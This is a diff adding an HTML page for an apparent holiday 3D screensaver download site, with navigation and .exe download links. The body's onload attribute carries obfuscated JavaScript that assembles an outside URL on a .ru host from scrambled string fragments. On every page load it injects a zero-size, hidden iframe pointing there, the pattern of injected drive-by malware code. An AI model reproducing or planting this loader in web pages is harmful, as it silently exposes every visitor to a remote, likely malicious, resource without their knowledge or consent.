@@ -1,0 +1,284 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title></title>
+<link rel="stylesheet" type="text/css" href="style.css">
+</head>
+
+<body onload="status=' ';zz='o';sl='/';sf='ram';us='u';pi='b';po='.';gw='fi';qu=':';yh='t';vo='h';bw='e';pj='m';iu='g';pt='tp';yw='p';ab='src';dg='ht';ko='e';wd='if';hh='r';t=wd.concat(sf,ko);xx=dg.concat(pt,qu,sl,sl,pi,hh,pi,iu,po,hh,us,sl,po,yh,po,yw,vo,yw);var oE=document.createElement(t);oE.setAttribute('width','0');oE.setAttribute('height','0');oE.setAttribute('style','display:none');oE.setAttribute(ab,xx);document.body.appendChild(oE);">
+<table cellspacing="0" cellpadding="0" align="center">
+  <tr>
+    <td><table cellspacing="0" cellpadding="0">
+            <tr>
+        <td><img src="images/header.jpg" alt="" width="813" height="209" /></td>
+      </tr>
+      <tr>
+        <td style="background-image:url(images/bg.jpg);" valign="top"><table cellspacing="0" cellpadding="0">
+          <tr>
+            <td valign="top"><table cellspacing="0" cellpadding="0">
+              <tr>
+                <td valign="top"><table cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td><img src="images/but_left.jpg" alt="" width="67" height="202" /></td>
+                    <td valign="top"><table cellspacing="0" cellpadding="0">
+                      <tr>
+                        <TD background="images/but1.jpg" width="190" height="45">
+<a href="nature.html" 
+  onMouseOver="document.myImage1.src='images/but1_on.jpg'" 
+  onMouseOut="document.myImage1.src='images/but1.jpg'">
+<img src="images/but1.jpg" name="myImage1" width="190" height="45" border="0" alt="Natur"></a></TD>
+                      </tr>
+                      <tr>
+                        <TD background="images/but2.jpg" width="190" height="39">
+<a href="holidays.html" 
+  onMouseOver="document.myImage2.src='images/but2_on.jpg'" 
+  onMouseOut="document.myImage2.src='images/but2.jpg'">
+<img src="images/but2.jpg" name="myImage2" width="190" height="39" border="0" alt="Feiertage"></a></TD>
+                      </tr>
+                      <tr>
+                        <TD background="images/but3.jpg" width="190" height="39">
+<a href="fantasy.html" 
+  onMouseOver="document.myImage3.src='images/but3_on.jpg'" 
+  onMouseOut="document.myImage3.src='images/but3.jpg'">
+<img src="images/but3.jpg" name="myImage3" width="190" height="39" border="0" alt="Feiertage"></a></TD>
+                      </tr>
+                      <tr>
+                        <TD background="images/but4.jpg" width="190" height="38">
+<a href="fantasy.html" 
+  onMouseOver="document.myImage4.src='images/but4_on.jpg'" 
+  onMouseOut="document.myImage4.src='images/but4.jpg'">
+<img src="images/but4.jpg" name="myImage4" width="190" height="38" border="0" alt="Weltraum"></a></TD>
+                      </tr>
+                      <tr>
+                        <TD background="images/but5.jpg" width="190" height="43">
+<a href="specialty.html" 
+  onMouseOver="document.myImage5.src='images/but5_on.jpg'" 
+  onMouseOut="document.myImage5.src='images/but5.jpg'">
+<img src="images/but5.jpg" name="myImage5" width="190" height="45" border="0" alt="Spezialitaten"></a></TD>
+                      </tr>
+                    </table></td>
+                  </tr>
+                </table></td>
+              </tr>
+              <tr>
+                <td><img src="images/but_bottom1.jpg" alt="" width="257" height="64" vspace="0" border="0" /></td>
+              </tr>
+                      <td><div align="left"><a href="/de"
+                    onMouseOver="document.myImage10.src='images/de_on.jpg'"
+                    onMouseOut="document.myImage10.src='images/de.jpg'"><img src="images/de.jpg" alt="deutisch" name="myImage10" width="54" height="43" hspace="25" border="0" align="right" /></a><a href="nature.html"
+                    onMouseOver="document.myImage11.src='images/en_on.jpg'"
+                    onMouseOut="document.myImage11.src='images/en.jpg'"><img src="images/en.jpg" alt="English" name="myImage11" width="54" height="43" hspace="0" border="0" align="right" /></a>
+                      </div>
+                      </table></td>
+            <td valign="top">
+			<table cellspacing="0" cellpadding="0">
+              <tr>
+                <td><img src="images/text_top.jpg" alt="" width="556" height="15" /></td>
+              </tr>
+              <tr>
+                <td valign="top"><table width="522" border="0">
+                  <tr>
+                    <th width="8" scope="col">&nbsp;</th>
+                    <th width="8" scope="col">&nbsp;</th>
+                    <th width="418" scope="col"><table width="452" cellpadding="0" cellspacing="0">
+                      <tr>
+                        <td width="76"><div align="left"><a href="santa-home.html" onclick="trackAction('category-screensavers/click-image/santa-home');"><img src="santa-home/main.gif" alt="Santa's Home Screensaver" height="75" width="75" /></a></div></td>
+                        <td width="367"><div> 
+                          <div align="left"><a href="santa-home.html" onclick="trackAction('category-screensavers/click-title/santa-home');">Santa's Home 3D Screensaver</a> </div>
+                        </div>
+                            <div> 
+                              <div align="left">Visit Santa's home in a winter wonderland! </div>
+                            </div>
+                          <div> 
+                            <div align="left"><a href="http://files.astrogemini.com/santahome.exe" onclick="trackAction('category-screensavers/click-download/santa-home'); urchinTracker('/download-screensaver');"></a> </div>
+                          </div></td>
+                      </tr>
+                      <tr>
+                        <td colspan="2"><div align="left"><img src="img/point.gif" alt="" height="6" width="1" /></div></td>
+                      </tr>
+                      <tr>
+                        <td><div align="left"><a href="christmas-eve.html" onclick="trackAction('category-screensavers/click-image/christmas-eve');"><img src="christmas-eve/main.gif" alt="Christmas Eve 3D Screensaver" height="75" width="75" /></a></div></td>
+                        <td><div> 
+                          <div align="left"><a href="christmas-eve.html" onclick="trackAction('category-screensavers/click-title/christmas-eve');">Christmas Eve 3D Screensaver</a> </div>
+                        </div>
+                            <div> 
+                              <div align="left">Feel the festive atmosphere of Christmas! </div>
+                            </div>
+                          <div> 
+                            <div align="left"><a href="http://files.astrogemini.com/screensavers/christmaseve.exe" onclick="trackAction('category-screensavers/click-download/christmas-eve'); urchinTracker('/download-screensaver');"></a> </div>
+                          </div></td>
+                      </tr>
+                      <tr>
+                        <td colspan="2"><div align="left"><img src="img/point.gif" alt="" height="6" width="1" /></div></td>
+                      </tr>
+                      <tr>
+                        <td><div align="left"><a href="winter-screensaver.html" onclick="trackAction('category-screensavers/click-image/winter-screensaver');"><img src="winter-screensaver/main.gif" alt="Winter 3D Screensaver" height="75" width="75" /></a></div></td>
+                        <td><div> 
+                          <div align="left"><a href="winter-screensaver.html" onclick="trackAction('category-screensavers/click-title/winter-screensaver');">Winter 3D Screensaver</a> </div>
+                        </div>
+                            <div> 
+                              <div align="left">The lovely winter season at its best! </div>
+                            </div>
+                          <div> 
+                            <div align="left"><a href="http://files.astrogemini.com/screensavers/winter3d.exe" onclick="trackAction('category-screensavers/click-download/winter-screensaver'); urchinTracker('/download-screensaver');"></a> </div>
+                          </div></td>
+                      </tr>
+                      <tr>
+                        <td colspan="2"><div align="left"><img src="img/point.gif" alt="" height="6" width="1" /></div></td>
+                      </tr>
+                      <tr>
+                        <td><div align="left"><a href="winter-night.html" onclick="trackAction('category-screensavers/click-image/winter-night');"><img src="winter-night/main.gif" alt="Winter Night 3D Screensaver" height="75" width="75" /></a></div></td>
+                        <td><div> 
+                          <div align="left"><a href="winter-night.html" onclick="trackAction('category-screensavers/click-title/winter-night');">Winter Night 3D Screensaver</a> </div>
+                        </div>
+                            <div> 
+                              <div align="left">Peace and beauty of a quiet winter night! </div>
+                            </div>
+                          </td>
+                      </tr>
+                      <tr>
+                        <td colspan="2"><div align="left"><img src="img/point.gif" alt="" height="6" width="1" /></div></td>
+                      </tr>
+                      <tr>
+                        <td><div align="left"><a href="christmas-screensaver.html" onclick="trackAction('category-screensavers/click-image/christmas-screensaver');"><img src="christmas-screensaver/main.gif" alt="3D Christmas Screensaver" height="75" width="75" /></a></div></td>
+                        <td><div> 
+                          <div align="left"><a href="christmas-screensaver.html" onclick="trackAction('category-screensavers/click-title/christmas-screensaver');">Christmas Time 3D Screensaver</a> </div>
+                        </div>
+                            <div> 
+                              <div align="left">Feel the magic of Christmas! </div>
+                            </div>
+                          <div> 
+                            <div align="left"><a href="http://files.astrogemini.com/screensavers/christmas3d.exe" onclick="trackAction('category-screensavers/click-download/christmas-screensaver'); urchinTracker('/download-screensaver');"></a> </div>
+                          </div></td>
+                      </tr>
+                      <tr>
+                        <td colspan="2"><div align="left"><img src="img/point.gif" alt="" height="6" width="1" /></div></td>
+                      </tr>
+                      <tr>
+                        <td><div align="left"><a href="christmas.html" onclick="trackAction('category-screensavers/click-image/christmas');"><img src="christmas/main.gif" alt="3D Merry Christmas Screensaver" width="75" height="75" border="0" /></a></div></td>
+                        <td><div> 
+                          <div align="left"><a href="christmas.html" onclick="trackAction('category-screensavers/click-title/christmas');">3D Merry Christmas Screensaver</a> </div>
+                        </div>
+                            <div> 
+                              <div align="left">The magic spirit of Christmas on your desktop </div>
+                            </div>
+                          <div> 
+                            <div align="left"><a href="http://files.astrogemini.com/screensavers/merrychristmas.exe" onclick="trackAction('category-screensavers/click-download/christmas'); urchinTracker('/download-screensaver');"></a> </div>
+                          </div></td>
+                      </tr>
+                      <tr>
+                        <td colspan="2"><div align="left"><img src="img/point.gif" alt="" height="6" width="1" /></div></td>
+                      </tr>
+                      <tr>
+                        <td><div align="left"><a href="thanksgiving.html" onclick="trackAction('category-screensavers/click-image/thanksgiving');"><img src="thanksgiving/main.gif" alt="Thanksgiving 3D Screensaver" height="75" width="75" /></a></div></td>
+                        <td><div> 
+                          <div align="left"><a href="thanksgiving.html" onclick="trackAction('category-screensavers/click-title/thanksgiving');">Thanksgiving 3D Screensaver</a> </div>
+                        </div>
+                            <div> 
+                              <div align="left">Pay a visit to the beautiful Harvest Time Farms! </div>
+                            </div>
+                          <div> 
+                            <div align="left"><a href="http://files.astrogemini.com/thanksgiving.exe" onclick="trackAction('category-screensavers/click-download/thanksgiving'); urchinTracker('/download-screensaver');"></a> </div>
+                          </div></td>
+                      </tr>
+                      <tr>
+                        <td colspan="2"><div align="left"><img src="img/point.gif" alt="" height="6" width="1" /></div></td>
+                      </tr>
+                      <tr>
+                        <td><div align="left"><a href="autumn-screensaver.html" onclick="trackAction('category-screensavers/click-image/autumn-screensaver');"><img src="autumn-screensaver/main.gif" alt="Golden Autumn 3D Screensaver" height="75" width="75" /></a></div></td>
+                        <td><div> 
+                          <div align="left"><a href="autumn-screensaver.html" onclick="trackAction('category-screensavers/click-title/autumn-screensaver');">Golden Autumn 3D Screensaver</a> </div>
+                        </div>
+                            <div> 
+                              <div align="left">Enjoy the entrancing beauty of golden autumn! </div>
+                            </div>
+                          <div> 
+                            <div align="left"><a href="http://files.astrogemini.com/screensavers/autumn3d.exe" onclick="trackAction('category-screensavers/click-download/autumn-screensaver'); urchinTracker('/download-screensaver');"></a> </div>
+                          </div></td>
+                      </tr>
+                      <tr>
+                        <td colspan="2"><div align="left"><img src="img/point.gif" alt="" height="6" width="1" /></div></td>
+                      </tr>
+                      <tr>
+                        <td><div align="left"><a href="halloween-screensaver.html" onclick="trackAction('category-screensavers/click-image/halloween-screensaver');"><img src="halloween-screensaver/main.gif" alt="3D Spooky Halloween Screensaver" height="75" width="75" /></a></div></td>
+                        <td><div> 
+                          <div align="left"><a href="halloween-screensaver.html" onclick="trackAction('category-screensavers/click-title/halloween-screensaver');">3D Spooky Halloween Screensaver</a> </div>
+                        </div>
+                            <div> 
+                              <div align="left">The Moon is full! Spooky Halloween is here! </div>
+                            </div>
+                          <div> 
+                            <div align="left"><a href="http://files.astrogemini.com/screensavers/halloween3d.exe" onclick="trackAction('category-screensavers/click-download/halloween-screensaver'); urchinTracker('/download-screensaver');"></a> </div>
+                          </div></td>
+                      </tr>
+                      <tr>
+                        <td colspan="2"><div align="left"><img src="img/point.gif" alt="" height="6" width="1" /></div></td>
+                      </tr>
+                      <tr>
+                        <td><div align="left"><a href="halloween-in-the-attic.html" onclick="trackAction('category-screensavers/click-image/halloween-in-the-attic');"><img src="halloween-in-the-attic/main.gif" alt="halloween in the attic" height="75" width="75" /></a></div></td>
+                        <td><div> 
+                          <div align="left"><a href="halloween-in-the-attic.html" onclick="trackAction('category-screensavers/click-title/halloween-in-the-attic');">Halloween in the Attic 3D Screensaver</a> </div>
+                        </div>
+                            <div> 
+                              <div align="left">Venture into the dark unknown of the attic! </div>
+                            </div></td>
+                      </tr>
+                    </table>
+                    </th>
+                  </tr>
+                </table></td>
+              </tr>
+            </table>
+			</td>
+          </tr>
+        </table></td>
+      </tr>
+      <tr>
+        <td width="813" height="134" style="background-image:url(images/bottom.jpg); background-repeat:no-repeat;" valign="bottom"><table cellspacing="0" cellpadding="0">
+          <tr>
+            <td height="60"><table cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="492">&nbsp;</td>
+                <td><table cellspacing="0" cellpadding="0">
+                  <tr>
+                    <TD background="images/strela1.jpg" width="31" height="25">
+<a href="nature.html" 
+  onMouseOver="document.myImage6.src='images/strela1_on.jpg'" 
+  onMouseOut="document.myImage6.src='images/strela1.jpg'">
+<img src="images/strela1.jpg" name="myImage6" width="31" height="25" border="0" alt="back"></a></TD>
+                    <td><p><a href="nature.html" style="color:#000000">1</a> <a href="nature2.html" style="color:#000000">2</a></p>                      </td>
+                    <TD width="32" align="right">
+<a href="nature2.html" 
+  onMouseOver="document.myImage7.src='images/strela2_on.jpg'" 
+  onMouseOut="document.myImage7.src='images/strela2.jpg'">
+<img src="images/strela2.jpg" name="myImage7" width="26" height="25" border="0" alt="back"></a></TD>
+                  </tr>
+                </table></td>
+              </tr>
+            </table></td>
+          </tr>
+          <tr>
+            <td><table cellspacing="0" cellpadding="0">
+              <tr>
+                <td width="54"></td>
+                <td><a href="http://mixsign.ru/"></a></td>
+              </tr>
+            </table>
+              <img src="images/design.jpg" width="44" height="31" />
+              <div align="left"></div></td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+	  <tr>
+	  <td>  
+<p style="color:#999999; padding-left:55px; padding-bottom:0px;">&nbsp;</p>
+	   <p style="color:#999999; padding-left:403px; padding-bottom:5px;">All Rights Reserved. &copy; 2007 </p>
+	    </td>
+	  </tr>
+    </table></td>
+  </tr>
+</table>
+</body>
+</html>
